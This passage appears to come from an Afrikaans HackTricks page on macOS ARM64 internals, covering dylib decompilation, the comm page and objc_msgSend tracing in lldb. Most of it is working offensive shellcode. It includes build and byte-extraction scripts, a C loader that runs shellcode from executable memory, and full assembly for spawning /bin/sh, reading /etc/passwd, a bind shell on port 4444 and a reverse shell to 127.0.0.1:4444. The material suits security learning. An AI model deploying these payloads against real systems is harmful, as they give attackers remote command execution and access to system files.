```
Let daarop dat **Ida** en **Ghidra** ook **spesifieke dylibs** uit die cache kan decompileer deur net die cache deur te gee.

> [!TIP]
> Soms is dit makliker om die **decompiled** kode van **`libsystem_kernel.dylib`** na te gaan **as** om die **source code** na te gaan, omdat die kode van verskeie syscalls (BSD en Mach) via scripts gegenereer word (kyk na die opmerkings in die source code), terwyl jy in die dylib kan sien wat geroep word.

### machdep calls

XNU ondersteun nog ’n tipe calls wat machine dependent genoem word. Die getalle van hierdie calls hang van die architecture af, en nóg die calls nóg die getalle word gewaarborg om konstant te bly.

### comm page

Dit is ’n kernel-beheerde geheueblad wat in die address space van elke gebruikersproses gemap word. Dit is bedoel om die oorgang van user mode na kernel space vinniger te maak as om syscalls te gebruik vir kernel-dienste wat so gereeld gebruik word dat hierdie oorgang baie ondoeltreffend sou wees.

Byvoorbeeld, die call `gettimeofdate` lees die waarde van `timeval` direk vanaf die comm page.

### objc_msgSend

Dit is baie algemeen om hierdie funksie in Objective-C- of Swift-programme te vind. Hierdie funksie laat jou toe om ’n metode van ’n Objective-C-objek te roep.

Parameters ([more info in the docs](https://developer.apple.com/documentation/objectivec/1456712-objc_msgsend)):<sup>[[4]](#references)</sup>

- x0: self -> Pointer na die instance
- x1: op -> Selector van die metode
- x2... -> Die res van die arguments van die invoked method

Dus, as jy ’n breakpoint voor die branch na hierdie funksie plaas, kan jy maklik in lldb vind wat invoked word (in hierdie voorbeeld roep die objek ’n objek van `NSConcreteTask` aan wat ’n command sal uitvoer):
```bash
# Right in the line were objc_msgSend will be called
(lldb) po $x0
<NSConcreteTask: 0x1052308e0>

(lldb) x/s $x1
0x1736d3a6e: "launch"

(lldb) po [$x0 launchPath]
/bin/sh

(lldb) po [$x0 arguments]
<__NSArrayI 0x1736801e0>(
-c,
whoami
)
```
> [!TIP]
> Deur die env variable **`NSObjCMessageLoggingEnabled=1`** te stel, is dit moontlik om aan te teken wanneer hierdie funksie geroep word in 'n file soos `/tmp/msgSends-pid`.
>
> Verder, deur **`OBJC_HELP=1`** te stel en enige binary te roep, kan jy ander environment variables sien wat jy kan gebruik om aan te teken wanneer sekere Objc-C actions plaasvind.

Wanneer hierdie funksie geroep word, moet die geroepte method van die aangeduide instance gevind word. Hiervoor word verskeie searches uitgevoer:

- Voer optimistiese cache lookup uit:
- Indien suksesvol, klaar
- Verkry runtimeLock (read)
- Indien (realize && !cls->realized), realize class
- Indien (initialize && !cls->initialized), initialize class
- Probeer die class se eie cache:
- Indien suksesvol, klaar
- Probeer die class se method list:
- Indien gevind, vul cache en klaar
- Probeer die superclass se cache:
- Indien suksesvol, klaar
- Probeer die superclass se method list:
- Indien gevind, vul cache en klaar
- Indien (resolver), probeer method resolver, en herhaal vanaf class lookup
- Indien steeds hier (= alles anders het misluk), probeer forwarder

### Shellcodes

Om te compile:
```bash
as -o shell.o shell.s
ld -o shell shell.o -macosx_version_min 13.0 -lSystem -L /Library/Developer/CommandLineTools/SDKs/MacOSX.sdk/usr/lib

# You could also use this
ld -o shell shell.o -syslibroot $(xcrun -sdk macosx --show-sdk-path) -lSystem
```
Om die grepe te onttrek:
```bash
# Code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/b729f716aaf24cbc8109e0d94681ccb84c0b0c9e/helper/extract.sh
for c in $(objdump -d "s.o" | grep -E '[0-9a-f]+:' | cut -f 1 | cut -d : -f 2) ; do
echo -n '\\x'$c
done
```
Vir nuwer macOS:
```bash
# Code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/fc0742e9ebaf67c6a50f4c38d59459596e0a6c5d/helper/extract.sh
for s in $(objdump -d "s.o" | grep -E '[0-9a-f]+:' | cut -f 1 | cut -d : -f 2) ; do
echo -n $s | awk '{for (i = 7; i > 0; i -= 2) {printf "\\x" substr($0, i, 2)}}'
done
```
<details>

<summary>C-kode om die shellcode te toets</summary>
```c
// code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/helper/loader.c
// gcc loader.c -o loader
#include <stdio.h>
#include <sys/mman.h>
#include <string.h>
#include <stdlib.h>

int (*sc)();

char shellcode[] = "<INSERT SHELLCODE HERE>";

int main(int argc, char **argv) {
printf("[>] Shellcode Length: %zd Bytes\n", strlen(shellcode));

void *ptr = mmap(0, 0x1000, PROT_WRITE | PROT_READ, MAP_ANON | MAP_PRIVATE | MAP_JIT, -1, 0);

if (ptr == MAP_FAILED) {
perror("mmap");
exit(-1);
}
printf("[+] SUCCESS: mmap\n");
printf("    |-> Return = %p\n", ptr);

void *dst = memcpy(ptr, shellcode, sizeof(shellcode));
printf("[+] SUCCESS: memcpy\n");
printf("    |-> Return = %p\n", dst);

int status = mprotect(ptr, 0x1000, PROT_EXEC | PROT_READ);

if (status == -1) {
perror("mprotect");
exit(-1);
}
printf("[+] SUCCESS: mprotect\n");
printf("    |-> Return = %d\n", status);

printf("[>] Trying to execute shellcode...\n");

sc = ptr;
sc();

return 0;
}
```
</details>

#### Shell

Geneem van [**hier**](https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/shell.s) en verduidelik.<sup>[[1]](#references)</sup>

{{#tabs}}
{{#tab name="with adr"}}
```armasm
.section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
.global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
.align 2              ; This directive tells the assembler to align the start of the _main function to the next 4-byte boundary (2^2 = 4).

_main:
adr  x0, sh_path  ; This is the address of "/bin/sh".
mov  x1, xzr      ; Clear x1, because we need to pass NULL as the second argument to execve.
mov  x2, xzr      ; Clear x2, because we need to pass NULL as the third argument to execve.
mov  x16, #59     ; Move the execve syscall number (59) into x16.
svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.

sh_path: .asciz "/bin/sh"
```
{{#endtab}}

{{#tab name="with stack"}}
```armasm
.section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
.global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
.align 2              ; This directive tells the assembler to align the start of the _main function to the next 4-byte boundary (2^2 = 4).

_main:
; We are going to build the string "/bin/sh" and place it on the stack.

mov  x1, #0x622F  ; Move the lower half of "/bi" into x1. 0x62 = 'b', 0x2F = '/'.
movk x1, #0x6E69, lsl #16 ; Move the next half of "/bin" into x1, shifted left by 16. 0x6E = 'n', 0x69 = 'i'.
movk x1, #0x732F, lsl #32 ; Move the first half of "/sh" into x1, shifted left by 32. 0x73 = 's', 0x2F = '/'.
movk x1, #0x68, lsl #48   ; Move the last part of "/sh" into x1, shifted left by 48. 0x68 = 'h'.

str  x1, [sp, #-8] ; Store the value of x1 (the "/bin/sh" string) at the location `sp - 8`.

; Prepare arguments for the execve syscall.

mov  x1, #8       ; Set x1 to 8.
sub  x0, sp, x1   ; Subtract x1 (8) from the stack pointer (sp) and store the result in x0. This is the address of "/bin/sh" string on the stack.
mov  x1, xzr      ; Clear x1, because we need to pass NULL as the second argument to execve.
mov  x2, xzr      ; Clear x2, because we need to pass NULL as the third argument to execve.

; Make the syscall.

mov  x16, #59     ; Move the execve syscall number (59) into x16.
svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.

```
{{#endtab}}

{{#tab name="with adr for linux"}}
```armasm
; From https://8ksec.io/arm64-reversing-and-exploitation-part-5-writing-shellcode-8ksec-blogs/
.section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
.global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
.align 2              ; This directive tells the assembler to align the start of the _main function to the next 4-byte boundary (2^2 = 4).

_main:
adr  x0, sh_path  ; This is the address of "/bin/sh".
mov  x1, xzr      ; Clear x1, because we need to pass NULL as the second argument to execve.
mov  x2, xzr      ; Clear x2, because we need to pass NULL as the third argument to execve.
mov  x16, #59     ; Move the execve syscall number (59) into x16.
svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.

sh_path: .asciz "/bin/sh"
```
{{#endtab}}
{{#endtabs}}

#### Lees met cat

Die doel is om `execve("/bin/cat", ["/bin/cat", "/etc/passwd"], NULL)` uit te voer, dus is die tweede argument (x1) ’n skikking van params (wat in memory ’n stack van die adresse beteken).
```armasm
.section __TEXT,__text     ; Begin a new section of type __TEXT and name __text
.global _main              ; Declare a global symbol _main
.align 2                   ; Align the beginning of the following code to a 4-byte boundary

_main:
; Prepare the arguments for the execve syscall
sub sp, sp, #48        ; Allocate space on the stack
mov x1, sp             ; x1 will hold the address of the argument array
adr x0, cat_path
str x0, [x1]           ; Store the address of "/bin/cat" as the first argument
adr x0, passwd_path    ; Get the address of "/etc/passwd"
str x0, [x1, #8]       ; Store the address of "/etc/passwd" as the second argument
str xzr, [x1, #16]     ; Store NULL as the third argument (end of arguments)

adr x0, cat_path
mov x2, xzr            ; Clear x2 to hold NULL (no environment variables)
mov x16, #59           ; Load the syscall number for execve (59) into x8
svc 0                  ; Make the syscall


cat_path: .asciz "/bin/cat"
.align 2
passwd_path: .asciz "/etc/passwd"
```
#### Roep command met sh vanaf ’n fork aan sodat die hoofproses nie beëindig word nie
```armasm
.section __TEXT,__text     ; Begin a new section of type __TEXT and name __text
.global _main              ; Declare a global symbol _main
.align 2                   ; Align the beginning of the following code to a 4-byte boundary

_main:
; Prepare the arguments for the fork syscall
mov x16, #2            ; Load the syscall number for fork (2) into x8
svc 0                  ; Make the syscall
cmp x1, #0             ; In macOS, if x1 == 0, it's parent process, https://opensource.apple.com/source/xnu/xnu-7195.81.3/libsyscall/custom/__fork.s.auto.html
beq _loop              ; If not child process, loop

; Prepare the arguments for the execve syscall

sub sp, sp, #64        ; Allocate space on the stack
mov x1, sp             ; x1 will hold the address of the argument array
adr x0, sh_path
str x0, [x1]           ; Store the address of "/bin/sh" as the first argument
adr x0, sh_c_option    ; Get the address of "-c"
str x0, [x1, #8]       ; Store the address of "-c" as the second argument
adr x0, touch_command  ; Get the address of "touch /tmp/lalala"
str x0, [x1, #16]      ; Store the address of "touch /tmp/lalala" as the third argument
str xzr, [x1, #24]     ; Store NULL as the fourth argument (end of arguments)

adr x0, sh_path
mov x2, xzr            ; Clear x2 to hold NULL (no environment variables)
mov x16, #59           ; Load the syscall number for execve (59) into x8
svc 0                  ; Make the syscall


_exit:
mov x16, #1            ; Load the syscall number for exit (1) into x8
mov x0, #0             ; Set exit status code to 0
svc 0                  ; Make the syscall

_loop: b _loop

sh_path: .asciz "/bin/sh"
.align 2
sh_c_option: .asciz "-c"
.align 2
touch_command: .asciz "touch /tmp/lalala"
```
#### Bind shell

Bind shell vanaf [https://raw.githubusercontent.com/daem0nc0re/macOS_ARM64_Shellcode/master/bindshell.s](https://raw.githubusercontent.com/daem0nc0re/macOS_ARM64_Shellcode/master/bindshell.s) op **poort 4444**<sup>[[2]](#references)</sup>.
```armasm
.section __TEXT,__text
.global _main
.align 2
_main:
call_socket:
// s = socket(AF_INET = 2, SOCK_STREAM = 1, 0)
mov  x16, #97
lsr  x1, x16, #6
lsl  x0, x1, #1
mov  x2, xzr
svc  #0x1337

// save s
mvn  x3, x0

call_bind:
/*
* bind(s, &sockaddr, 0x10)
*
* struct sockaddr_in {
*     __uint8_t       sin_len;     // sizeof(struct sockaddr_in) = 0x10
*     sa_family_t     sin_family;  // AF_INET = 2
*     in_port_t       sin_port;    // 4444 = 0x115C
*     struct  in_addr sin_addr;    // 0.0.0.0 (4 bytes)
*     char            sin_zero[8]; // Don't care
* };
*/
mov  x1, #0x0210
movk x1, #0x5C11, lsl #16
str  x1, [sp, #-8]
mov  x2, #8
sub  x1, sp, x2
mov  x2, #16
mov  x16, #104
svc  #0x1337

call_listen:
// listen(s, 2)
mvn  x0, x3
lsr  x1, x2, #3
mov  x16, #106
svc  #0x1337

call_accept:
// c = accept(s, 0, 0)
mvn  x0, x3
mov  x1, xzr
mov  x2, xzr
mov  x16, #30
svc  #0x1337

mvn  x3, x0
lsr  x2, x16, #4
lsl  x2, x2, #2

call_dup:
// dup(c, 2) -> dup(c, 1) -> dup(c, 0)
mvn  x0, x3
lsr  x2, x2, #1
mov  x1, x2
mov  x16, #90
svc  #0x1337
mov  x10, xzr
cmp  x10, x2
bne  call_dup

call_execve:
// execve("/bin/sh", 0, 0)
mov  x1, #0x622F
movk x1, #0x6E69, lsl #16
movk x1, #0x732F, lsl #32
movk x1, #0x68, lsl #48
str  x1, [sp, #-8]
mov	 x1, #8
sub  x0, sp, x1
mov  x1, xzr
mov  x2, xzr
mov  x16, #59
svc  #0x1337
```
#### Reverse shell

Vanaf [https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/reverseshell.s](https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/reverseshell.s), revshell na **127.0.0.1:4444**<sup>[[3]](#references)</sup>.
```armasm
.section __TEXT,__text
.global _main
.align 2
_main:
call_socket:
// s = socket(AF_INET = 2, SOCK_STREAM = 1, 0)
mov  x16, #97
lsr  x1, x16, #6
lsl  x0, x1, #1
mov  x2, xzr
svc  #0x1337

// save s
mvn  x3, x0

call_connect:
/*
* connect(s, &sockaddr, 0x10)
*
* struct sockaddr_in {
*     __uint8_t       sin_len;     // sizeof(struct sockaddr_in) = 0x10
*     sa_family_t     sin_family;  // AF_INET = 2
*     in_port_t       sin_port;    // 4444 = 0x115C
*     struct  in_addr sin_addr;    // 127.0.0.1 (4 bytes)
*     char            sin_zero[8]; // Don't care
* };
*/
mov  x1, #0x0210
movk x1, #0x5C11, lsl #16
movk x1, #0x007F, lsl #32
movk x1, #0x0100, lsl #48
str  x1, [sp, #-8]
mov  x2, #8
sub  x1, sp, x2
mov  x2, #16
mov  x16, #98
svc  #0x1337

lsr  x2, x2, #2

call_dup:
// dup(s, 2) -> dup(s, 1) -> dup(s, 0)
mvn  x0, x3
lsr  x2, x2, #1
mov  x1, x2
mov  x16, #90
svc  #0x1337
mov  x10, xzr
cmp  x10, x2
bne  call_dup

call_execve:
// execve("/bin/sh", 0, 0)
mov  x1, #0x622F
movk x1, #0x6E69, lsl #16
movk x1, #0x732F, lsl #32
movk x1, #0x68, lsl #48
str  x1, [sp, #-8]
mov	 x1, #8
sub  x0, sp, x1
mov  x1, xzr
mov  x2, xzr
mov  x16, #59
svc  #0x1337
```
## Verwysings

- [1] [daem0nc0re/macOS_ARM64_Shellcode - shell.s](https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/shell.s)
- [2] [daem0nc0re/macOS_ARM64_Shellcode - bindshell.s](https://raw.githubusercontent.com/daem0nc0re/macOS_ARM64_Shellcode/master/bindshell.s)
- [3] [daem0nc0re/macOS_ARM64_Shellcode - reverseshell.s](https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/reverseshell.s)
- [4] [Apple Developer - 712 Objc Msgsend](https://developer.apple.com/documentation/objectivec/1456712-objc_msgsend)

{{#include ../../../banners/hacktricks-training.md}}
